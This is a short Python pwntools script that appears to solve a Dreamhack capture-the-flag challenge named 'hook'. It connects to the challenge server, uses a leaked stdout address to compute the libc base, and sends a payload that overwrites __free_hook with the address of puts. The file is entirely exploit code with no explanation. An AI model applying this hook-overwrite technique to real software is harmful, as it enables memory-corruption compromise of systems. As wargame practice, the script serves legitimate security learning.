from pwn import *

# p = process("./hook")
# nc host1.dreamhack.games 13515
p = remote("host1.dreamhack.games", 13515)
libc = ELF("./libc.so.6")

p.recvuntil("stdout: ")
stdout = int(p.recv(14), 16)
# free_hook = stdout + 0x1188
# libc_base = stdout - 0x3c5620
# puts = libc_base + 0x6f6a0

libc.address = stdout - libc.symbols["_IO_2_1_stdout_"]
free_hook = libc.symbols["__free_hook"]
puts = libc.symbols["puts"]

log.info("stdout: " + hex(stdout))
log.info("free_hook: " + hex(free_hook))
log.info("puts: " + hex(puts))

p.sendlineafter("Size: ", str(20))

input()

p.recvuntil("Data: ")

pay = b""
pay += p64(free_hook)
pay += p64(puts)

p.send(pay)


p.interactive()